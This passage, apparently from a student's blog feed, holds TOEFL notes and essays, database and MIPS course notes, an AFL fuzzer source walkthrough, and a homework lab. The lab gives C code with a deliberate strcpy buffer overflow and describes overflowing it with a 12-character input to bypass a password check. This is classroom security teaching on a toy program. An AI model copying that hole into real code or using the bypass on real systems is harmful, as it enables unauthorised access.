<p>Hanseatic merchants established foreign trading centers, the most famous of which was the London Steelyard, a <code>walled(封闭的)</code> community with warehouses, offices, a church, and <code>residential quarters(住宅区)</code> for company representatives. </p>
<h3 id="Paragraph-3"><a href="#Paragraph-3" class="headerlink" title="Paragraph 3"></a>Paragraph 3</h3><p>By the late thirteenth century, Hanseatic merchants had developed an important business technique, the business register. Merchants publicly recorded their debts and contracts and received a league guarantee for them. This device proved a decisive factor in the later development of credit and commerce in northern Europe.</p>
<h3 id="Paragraph-4"><a href="#Paragraph-4" class="headerlink" title="Paragraph 4"></a>Paragraph 4</h3><p>These developments added up to what one modern scholar has called “a commercial revolution.” </p>
<p><code>In the long run(归根到底)</code>, the commercial revolution of the High Middle Ages (a d 1000-1300) brought about <code>radical change(根本性的变化)</code> in European society. </p>
<p>One <code>remarkable(显著的)</code> aspect of this change was that the commercial classes <code>constituted(组成)</code> a small part of the total population—never more than 10 percent. </p>
<p>They <code>exercised an influence(施加影响)</code> far <code>in excess of(超过)</code> their numbers. </p>
<p>The commercial revolution created a great deal of new wealth, which meant a higher standard of living. The existence of wealth did not <code>escape the attention of</code> kings and other rulers.</p>
<p> Wealth could be taxed, and through taxation, kings could create strong and centralized states. In the years to come, alliances with the middle classes were to enable kings to weaken aristocratic <code>interests(利益)</code> and build the states that came to be called modern.</p>
<h3 id="Paragraph-5"><a href="#Paragraph-5" class="headerlink" title="Paragraph 5"></a>Paragraph 5</h3><p>The commercial revolution also provided the opportunity for thousands of agricultural workers to improve their social position.</p>
<blockquote>
<p>social position     社会位置</p>
<p>social status    社会地位</p>
<p>社会地位指一个人在社会中所获得的经常依赖于其社会位置的尊敬和声望等等</p>
</blockquote>
<p>The slow but steady transformation of European society from almost completely rural and isolated to relatively more urban constituted <code>the greatest effect of(影响)</code> the commercial revolution that began in the eleventh century. </p>
<p>Even so, merchants and business people did not <code>run medieval communities(掌控中世纪社会)</code>, except in central and northern Italy and in the county of Flanders. </p>
<p>Most towns remained small. The nobility and churchmen determined the <code>predominant(主要的)</code> <code>social attitudes(社会态度)</code>,<code>values(价值观)</code> , and <code>patterns of thought and behavior(思想和行为模式)</code> . The commercial changes of the eleventh through fourteenth centuries did however,<code>lay the economic foundation for</code> the development of urban life and culture.</p>
<blockquote>
<p>lie the foundation for sth.    为……打下基础</p>
</blockquote>
]]></content>
      <categories>
        <category>TOEFL</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>英语阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业四：OLLYDBG软件破解</title>
    <url>/2020/04/10/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%9B%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><div class="note info">
            <ul><li>IDA查看伪代码</li><li>利用OllyDBG进行准确字符串填充长度判断</li></ul>
          </div>


<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>对如下程序编译产生debug模式下的exe程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"1234567"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span><span class="params">(<span class="keyword">char</span>* password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> authenticated;</span><br><span class="line">	<span class="keyword">char</span> buffeer[<span class="number">12</span>];<span class="comment">//add local buff to be overflowed</span></span><br><span class="line">	authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">	<span class="built_in">strcpy</span>(<span class="built_in">buffer</span>,password);</span><br><span class="line">	<span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"please input password: "</span>);</span><br><span class="line">    	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,password);</span><br><span class="line">    	valid_flag=verify_password(password);</span><br><span class="line">    	<span class="keyword">if</span>(valid_flag)</span><br><span class="line">    		<span class="built_in">printf</span>(<span class="string">"incorrect password!\n\n"</span>);</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line">    		<span class="keyword">break</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><ul>
<li>题目：<ul>
<li>对上述EXE程序，用IDA查看逆向分析的伪代码，利用OllyDBG进行准确字符串填充长度判断，并完成漏洞利用的实验，使得输入一定字符串后验证通过。</li>
</ul>
</li>
<li>用IDA查看逆向分析伪代码</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%9B%9B/image-20200330203236172.png"  alt="image-20200330203236172"></p>
<ul>
<li><p>OllyDBG进行字符串填充长度判断</p>
<ul>
<li>authenticated<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%9B%9B/image-20200330210531075.png"  alt="image-20200330210531075"></li>
</ul>
</li>
<li>buffer<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%9B%9B/image-20200330210838482.png"  alt="image-20200330210838482"></li>
<li>可以判断出buffer长12个字节</li>
</ul>
</li>
</ul>
</li>
<li><p>完成漏洞测试实验</p>
<ul>
<li>思路：用非法的超长密码修改buffer临界变量authenticated</li>
<li>输入长为十二字节的数据，字符串共13个字节，末尾为’\0’,覆盖密码输入不正确时authenticated的01</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%9B%9B/image-20200330211542610.png"  alt="image-20200330211542610"></li>
<li>测试成功</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%9B%9B/image-20200330211735142.png"  alt="image-20200330211735142"></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>IDA</tag>
        <tag>ollydbg</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库上机L5</title>
    <url>/2020/04/10/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="优化查询速度——数据库索引"><a href="#优化查询速度——数据库索引" class="headerlink" title="优化查询速度——数据库索引"></a>优化查询速度——数据库索引</h1><ul>
<li>数据库索引<ul>
<li>B/B+树 -&gt; 范围检索</li>
<li>哈希表 -&gt; 值检索</li>
</ul>
</li>
<li>MyISAM用B+树作为索引，叶节点的data域存放的是数据记录的地址</li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>综合写作 2020-4</title>
    <url>/2020/04/06/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/%E7%BB%BC%E5%90%88%E5%86%99%E4%BD%9C-2020-4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="TPO49"><a href="#TPO49" class="headerlink" title="TPO49"></a>TPO49</h3><h4 id="我的答案"><a href="#我的答案" class="headerlink" title="我的答案"></a>我的答案</h4><p>In the reading passage, the author states that humpback whales may navigate by stars to migrate long distances. However, the professor refutes this idea and thinks the reasons listed in the reading are unconvincing. First of all, the author claims that humpback whales are intelligent enough to navigate by stars, while the professor states that there is no correlation between intelligence and an animal’s ability to use stars for navigation. For example, some birds such as ducks evolved the ability for navigation by stars. And ducks are only of general cognitive ability, not as advanced as humpback whales’. So, it seems that there is no real connection between intelligence and the ability to use stars for navigation. In addition, the author argues that humpback whales have no land features in the ocean to help them migrate in straight lines for long distance. So, they have to rely on stars. However, the professor challenges this statement by pointing out that the presence of biomagnetite in the brains of humpback whales enables them to be sensitive to Earth’s magnetic field. It is Earth’s magnetic field that helps humpback whales to migrate. Finally, the professor cast doubt on what is stated in the reading that humpback whales look at the stars through spy-hopping, which is a rare behavior among marine animals. He claims that there is no connection between spy-hopping and looking at stars since there are other animals exhibit this behavior but do not migrate, such as sharks. Also, humpback whales do spyhop during the day when there are no stars can be seen in the sky. So, the statement that humpback whales adopt spyhopping to look at stars is not convincing.</p>
<h4 id="范文"><a href="#范文" class="headerlink" title="范文"></a>范文</h4><p>In the reading passage, the author states that humpback whales may navigate by stars to migrate long distances. However, the professor refutes this idea and thinks the reasons listed in the reading are unconvincing. </p>
<p>First of all, the author claims that humpback whales are intelligent enough to navigate by stars, while the professor states that there is no correlation between intelligence and an animal’s ability to use stars for navigation. For example, some birds such as ducks evolved the ability for navigation by stars. And ducks are only of general cognitive ability, not as advanced as humpback whales’. So, it seems that there is no real connection between intelligence and the ability to use stars for navigation.</p>
<p>In addition, the author argues that humpback whales have no land features in the ocean to help them migrate in straight lines for long distance. So, they have to rely on stars. However, the professor challenges this statement by pointing out that the presence of biomagnetite in the brains of humpback whales enables them to be sensitive to Earth’s magnetic field. It is Earth’s magnetic field that helps humpback whales to migrate. </p>
<p>Finally, the professor cast doubt on what is stated in the reading that humpback whales look at the stars through spy-hopping, which is a rare behavior among marine animals. He claims that there is no connection between spy-hopping and looking at stars since there are other animals exhibit this behavior but do not migrate, such as sharks. Also, humpback whales do spyhop during the day when there are no stars can be seen in the sky. So, the statement that humpback whales adopt spyhopping to look at stars is not convincing.</p>
]]></content>
  </entry>
  <entry>
    <title>托福综合写作模板</title>
    <url>/2020/04/06/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/%E6%89%98%E7%A6%8F%E7%BB%BC%E5%90%88%E5%86%99%E4%BD%9C%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>The author and the speaker are discussing 【阅读第一段信息总结，即阅读和听力在讨论的话题】. The author thinks that 【阅读立场，往往在阅读第一段最后一句】. However, the speaker casts doubt on the reading’s position.</p>
<p>Firstly, the autor says that 【阅读第二段第一句&amp;最后一句信息总结；阅读和听力都讨论的点】. However, the speaker opposes the saying that 【听力对阅读的反驳事实信息，往往为1-2点】.</p>
<p>Secondly, the author believes that 【阅读第三段第一句&amp;最后一句信息总结；阅读和听力都讨论的点】. In contrast, the speaker disagrees with it and says that 【听力对阅读的反驳事实信息，往往为1-2点】.</p>
<p>Thirdly, the author thinks that 【阅读第四段第一句&amp;最后一句信息总结；阅读和听力都讨论的点】. On the contrary, the speaker contradicts it by saying that 【听力对阅读的反驳事实信息，往往为1-2点】.</p>
]]></content>
      <categories>
        <category>TOEFL</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>写作</tag>
      </tags>
  </entry>
  <entry>
    <title>AFL源码分析</title>
    <url>/2020/04/06/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>[toc]</p>
<h2 id="文件处理过程"><a href="#文件处理过程" class="headerlink" title="文件处理过程"></a>文件处理过程</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/images/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.assets/20190330215605-8fcb26f2-52f3-1.png"  alt="img"></p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h3><ul>
<li><code>afl-gcc</code>是<code>gcc/g++</code>的wrapper,调用gcc/g++</li>
<li><code>afl-gcc</code>设置<code>-B direcotry</code></li>
<li>gcc/g++调用afl对应的cpp、cc1/cc1/plus、as、ld。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  afl-gcc.c:main()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">find_as(argv[<span class="number">0</span>]); <span class="comment">//查找argv[0]的目录(即afl-gcc的目录)供 edit_params()函数使用</span></span><br><span class="line"></span><br><span class="line">edit_params(argc, argv); <span class="comment">//设置 -B 选项和参数</span></span><br><span class="line"></span><br><span class="line">execvp(cc_params[<span class="number">0</span>], (<span class="keyword">char</span>**)cc_params); <span class="comment">//调用 gcc</span></span><br></pre></td></tr></table></figure>

<h3 id="afl-as"><a href="#afl-as" class="headerlink" title="afl-as"></a>afl-as</h3><ul>
<li><p>AFL的代码插桩，是在将源文件编译为汇编代码后，通过<code>afl-as</code>完成的</p>
</li>
<li><p>afl-as是as的封装</p>
</li>
<li><p><code>afl-as</code>会在汇编代码的代码相应位置插入统计代码，然后调用真正的<code>as</code>进行汇编。统计代码是在<code>afl-as.h</code>文件中，<code>afl-as</code>负责找到每个 <em>basic block</em> 插入 <code>afl-as.h</code>中的统计代码。<code>afl-as.c:main()</code>主要调用了两个函数：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">afl-as.c:main()</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">edit_params(argc, argv); &#x2F;&#x2F;调整传递给真正的汇编器&#96;as&#96;的参数。</span><br><span class="line"></span><br><span class="line">add_instrumentation(); &#x2F;&#x2F;判断分支，插入统计代码</span><br></pre></td></tr></table></figure>

<h4 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation()"></a>add_instrumentation()</h4><ul>
<li><p>Process input file, generate modified_file. Insert instrumentation in all the appropriate places.</p>
<h5 id="查找代码部分"><a href="#查找代码部分" class="headerlink" title="查找代码部分"></a>查找代码部分</h5></li>
<li><p>只对代码部分插桩</p>
</li>
<li><p>利用代码文件的符号排列格式进行判断</p>
</li>
<li><p>如果是代码部分则会将instr_ok置1</p>
</li>
</ul>
<h5 id="查找基本块"><a href="#查找基本块" class="headerlink" title="查找基本块"></a>查找基本块</h5><ul>
<li>方法<ul>
<li>标识符：以 “点号”(<code>.</code>)开始,以“冒号”(<code>:</code>)结束，中间是字母数字组合</li>
<li>跳转指令：<ul>
<li>一般是进行比较根据比较结果来决定是否跳转(如 jnz xxx)，条件跳转指令的下一条也是一个 <em>basic block</em> 的开始处。</li>
<li>如果是跳转指令则在指令后插入统计代码</li>
</ul>
</li>
<li>instrument_next置1</li>
</ul>
</li>
</ul>
<h4 id="插桩"><a href="#插桩" class="headerlink" title="插桩"></a>插桩</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE));</span><br></pre></td></tr></table></figure>

<p>这里通过<code>fprintf()</code>将格式化字符串添加到汇编文件的相应位置</p>
<p><code>R(MAP_SIZE)</code>即为0到MAP_SIZE之间的一个随机数。</p>
<p>eg.trampoline_fmt_32</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static const u8* trampoline_fmt_32 &#x3D;</span><br><span class="line"></span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;&#x2F;* --- AFL TRAMPOLINE (32-BIT) --- *&#x2F;\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;.align 4\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;leal -16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;movl %%edi, 0(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%edx, 4(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%ecx, 8(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%eax, 12(%%esp)\n&quot;</span><br><span class="line">  &quot;movl $0x%08x, %%ecx\n&quot;</span><br><span class="line">  &quot;call __afl_maybe_log\n&quot;</span><br><span class="line">  &quot;movl 12(%%esp), %%eax\n&quot;</span><br><span class="line">  &quot;movl 8(%%esp), %%ecx\n&quot;</span><br><span class="line">  &quot;movl 4(%%esp), %%edx\n&quot;</span><br><span class="line">  &quot;movl 0(%%esp), %%edi\n&quot;</span><br><span class="line">  &quot;leal 16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;&#x2F;* --- END --- *&#x2F;\n&quot;</span><br><span class="line">  &quot;\n&quot;;</span><br></pre></td></tr></table></figure>

<p>这一段汇编代码，主要的操作是：</p>
<ul>
<li>保存<code>edi</code>等寄存器</li>
<li>将<code>ecx</code>的值设置为<code>fprintf()</code>所要打印的变量内容</li>
<li>调用方法<code>__afl_maybe_log()</code></li>
<li>恢复寄存器</li>
</ul>
<p><code>__afl_maybe_log</code>是插桩代码所执行的实际内容</p>
<h3 id="fork-server"><a href="#fork-server" class="headerlink" title="fork server"></a>fork server</h3><p>确定性 -fork- 子进程随机性</p>
<p>插桩</p>
<h2 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h2><h3 id="gcc-cc1"><a href="#gcc-cc1" class="headerlink" title="gcc/cc1"></a>gcc/cc1</h3><p>The <code>g++</code> is a compiler driver. It knows how to invoke the actual compiler (<code>cc1plus</code>), assembler and linker. It does <em>not</em> know how to parse or compile the sources.</p>
<h3 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h3><p>fork函数将运行着的程序分成2个（几乎）完全一样的进程，每个进程都启动一个从代码的同一位置开始执行的线程。这两个进程中的线程继续执行，就像是两个用户同时启动了该应用程序的两个副本。</p>
<h2 id="参考网页"><a href="#参考网页" class="headerlink" title="参考网页"></a>参考网页</h2><ul>
<li><a href="https://xz.aliyun.com/t/4628" target="_blank" rel="noopener">https://xz.aliyun.com/t/4628</a></li>
<li><a href="https://www.dazhuanlan.com/2020/03/04/5e5f13ab06638/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2020/03/04/5e5f13ab06638/</a></li>
<li><a href="https://rk700.github.io/2017/12/28/afl-internals/" target="_blank" rel="noopener">https://rk700.github.io/2017/12/28/afl-internals/</a></li>
<li><a href="https://stackoverflow.com/questions/19899750/what-is-the-difference-between-gcc-g-and-cc1-cc1plus" target="_blank" rel="noopener">https://stackoverflow.com/questions/19899750/what-is-the-difference-between-gcc-g-and-cc1-cc1plus</a></li>
<li><a href="https://baike.baidu.com/item/fork/7143171?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/fork/7143171?fr=aladdin</a></li>
</ul>
]]></content>
      <categories>
        <category>AFL</category>
      </categories>
      <tags>
        <tag>AFL</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>独立写作 2020-4</title>
    <url>/2020/04/06/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/%E7%8B%AC%E7%AB%8B%E5%86%99%E4%BD%9C-2020-4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>我的答案</li>
<li>范文</li>
<li>对比学习</li>
</ul>
<a id="more"></a>

<h3 id="TPO49-独立写作"><a href="#TPO49-独立写作" class="headerlink" title="TPO49 独立写作"></a>TPO49 独立写作</h3><p><strong>Do you agree or disagree with the following statement?The ability to maintain friendships with a small number of people over a long period of time is more important for happiness than the ability to make many new friends easily. Use specific reasons and examples to support your answer.</strong></p>
<h3 id="我的答案"><a href="#我的答案" class="headerlink" title="我的答案"></a>我的答案</h3><p>Nowadays, with the development of society, men have to contact more people than before, so it is essential to be capable to make many new friends easily. But some people still think the ability to maintain friendships with a small number of people over a long period of time is more import for happiness. Personally, I agree on the latter one, that maintain friendships with a few people contribute to happiness more, and my reasons are elaborated as below.</p>
<p>First, it’s a confirmation of my personality. Because the ones know me for a long period of time know more about my drawbacks, and they still choose to be a friend of mine even though they know my drawbacks. And they think my good points weigh more than shortcomings. Also one will not maintain friendships with those who are selfish and just think of themselves. It shows a trust of my quality to maintain friendship with me. Sure I will feel happier with this kind of confirmation.</p>
<p>Second, that spend more time with specific old friends can be relaxing. As a result of knowing each other much more than new friends. We share a lot of memories and we can talk about that. And we know the past of each other, the good ones, and the bad ones. For example, when I’m upset, my old friends can avoid talking about the points which could make me sadder, because they know more about my stories. Also they are more likely to know which words could make me happier.</p>
<p>Admittedly, I can learn a lot of good thing from my friends, thus having the ability to make many new friends easily means I can learn more. However, friendship should be pure and without just thinking about benefits and having a few ones whom I can talk with from the bottom of my heart is enough.</p>
<p>To sum up, the ability to maintain friendships with a small group of people over a long period of time is more important to happiness. As this ability can contribute to a more reliable and relaxing friendship.</p>
<h3 id="范文"><a href="#范文" class="headerlink" title="范文"></a>范文</h3><p>Friendship and kinship contribute a lot to one’s happiness. Then, the question goes, “does the ability to main long-term friendships with a small number of people matters more than the ability to make many new friends easily?” My answer is “yes”. First of all, old friends usually show stronger loyalty than those newly-acquainted fellows. That means, no matter what happens, these friends would always stand by your side and provide you with supports unconditionally. However, this merit is usually missing in short-term friendship. Last year when I was in hospital, 2 of my old friends took turns to take care of me, accompanying me to endure the very hard time. However, few of my “wide-range” new friends even came to visit me. It is clearly that long-term friendship is much more reliable and the ability to main such kind of relationship is more critical. In addition, old friends tend to show more understanding of you, being familiar with your hobbies, interests and some other peculiarities. So, it is usually more comfortable for me to be with my old friends. For instance, I am lactose intolerant and every time when I have dinner with my old friends, they would skip anything that contains milk or cheese, ordering food based on my favor. Contrary to my old friends’ consideration, those newly-acquainted fellows are inclined to show surprise about my intolerance and still pick the food of lactose they prefer. So, to me, old friends are much more considerate and contribute more to my happiness. Admittedly, the ability to make new friends easily are quite important for a person to get new ideas, broadening their views from different groups of people. However, compared with the ability to maintain long-term friendship, it still plays a less significant role for one’s happiness. To sum up, one’s happiness is consist of various parts, including self-achievement, security and etc. And I believe long-term friendship is of higher importance than other parts. As a result, the ability to maintain long-term friendship with a small group of people is much more important.</p>
<h3 id="对比学习"><a href="#对比学习" class="headerlink" title="对比学习"></a>对比学习</h3>]]></content>
      <categories>
        <category>TOEFL</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>写作</tag>
      </tags>
  </entry>
  <entry>
    <title>计组笔记</title>
    <url>/2020/04/06/%E8%AE%A1%E7%BB%84%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>陌生知识点</li>
</ul>
<a id="more"></a>

<h2 id="第二章-指令：计算机的语言"><a href="#第二章-指令：计算机的语言" class="headerlink" title="第二章 指令：计算机的语言"></a>第二章 指令：计算机的语言</h2><ul>
<li><p>背指令</p>
</li>
<li><p>寄存器</p>
<ul>
<li>函数调用过程中</li>
</ul>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>$a0~a3</td>
<td>用于<strong>传递参数</strong>的四个寄存器</td>
</tr>
<tr>
<td>$v0~v1</td>
<td>用于<strong>返回值</strong>的两个值寄存器</td>
</tr>
<tr>
<td>$ra</td>
<td>用于<strong>返回起始点</strong>的返回地址寄存器</td>
</tr>
<tr>
<td>$t0~t9</td>
<td>10个<strong>临时寄存器</strong>，在过程调用中不必被调用者（被调用的过程）保存</td>
</tr>
<tr>
<td>$s0~t7</td>
<td>8个<strong>保留寄存器</strong>，在过程调用中必须被保存（一旦被使用，由被调用者保存和恢复）</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>保留</th>
<th>不保留</th>
</tr>
</thead>
<tbody><tr>
<td>保存指针寄存器：$s0~s7</td>
<td>临时寄存器：$t0~t7</td>
</tr>
<tr>
<td>栈指针寄存器：$sp</td>
<td>参数寄存器：$a0~a3</td>
</tr>
<tr>
<td>返回地址寄存器：</td>
<td>返回值寄存器：$v0~v1</td>
</tr>
<tr>
<td>栈指针以上的栈</td>
<td>栈指针一下的栈</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>名称</th>
<th>寄存器号</th>
<th>用途</th>
<th>调用时是否保存</th>
</tr>
</thead>
<tbody><tr>
<td>$zero</td>
<td>0</td>
<td>常数0</td>
<td>不适用</td>
</tr>
<tr>
<td>$v0~v1</td>
<td>2~3</td>
<td>计算结果和表达式求值</td>
<td>否</td>
</tr>
<tr>
<td>$a0~a3</td>
<td>4~7</td>
<td>参数</td>
<td>否</td>
</tr>
<tr>
<td>$t0~t7</td>
<td>8~15</td>
<td>临时变量</td>
<td>否</td>
</tr>
<tr>
<td>$s0~s7</td>
<td>16~23</td>
<td>保存的寄存器</td>
<td><strong>是</strong></td>
</tr>
<tr>
<td>$t8~t9</td>
<td>24~25</td>
<td>更多的临时变量</td>
<td>否</td>
</tr>
<tr>
<td>$gp</td>
<td>28</td>
<td>全局指针</td>
<td><strong>是</strong></td>
</tr>
<tr>
<td>$sp</td>
<td>29</td>
<td>栈指针</td>
<td><strong>是</strong></td>
</tr>
<tr>
<td>$fp</td>
<td>30</td>
<td>帧指针</td>
<td><strong>是</strong></td>
</tr>
<tr>
<td>$ra</td>
<td>31</td>
<td>返回地址</td>
<td><strong>是</strong></td>
</tr>
</tbody></table>
</li>
</ul>
<ul>
<li><p>叶函数调用示例</p>
<ul>
<li><p>C:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int fact (int n)</span><br><span class="line">&#123;</span><br><span class="line">	 if (n&lt;1) return 1</span><br><span class="line">	 else return (n*fact(n-1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>MIPS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fact:</span><br><span class="line">	addi	$sp, $sp, -8;	# adjust stack for 2 items</span><br><span class="line">	sw		$ra, 4($sp);	# save the return address</span><br><span class="line">	sw		$a0, 0($sp);	# save the argument n</span><br><span class="line">	</span><br><span class="line">stli	$t0, $a0, 1		# test for n&lt;1</span><br><span class="line">beq		$t0, $zero, L1	# if n &gt;&#x3D; 1, go to L1</span><br><span class="line"></span><br><span class="line">addi	$v0, $zero, 1	# reurn 1</span><br><span class="line">addi	$sp, $sp, 8		# pop 2 items off stack</span><br><span class="line">jr 		$ra				# return to caller</span><br><span class="line"></span><br><span class="line">L1:	addi	$a0, $a0, -1	# n &gt;&#x3D; 1: argument gets (n-1)</span><br><span class="line">	jal		fact			# call fact with (n-1)</span><br><span class="line">	</span><br><span class="line"># fact 的返回位置</span><br><span class="line">lw		$a0, 0($sp)		# return from jal: restore argument n</span><br><span class="line">lw		$ra, 4($sp)		# restore the return address</span><br><span class="line">addi	$sp, $sp, 8		# adjust stack pointer to pop 2 items</span><br><span class="line"></span><br><span class="line">mul 	$v0, $a0, $v0	# return n*fact(n-1)</span><br><span class="line"></span><br><span class="line">jr		$ra				#return to the caller</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>计算机组成原理</category>
      </categories>
  </entry>
  <entry>
    <title>阅读错误总结</title>
    <url>/2020/04/06/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/%E9%98%85%E8%AF%BB%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93/</url>
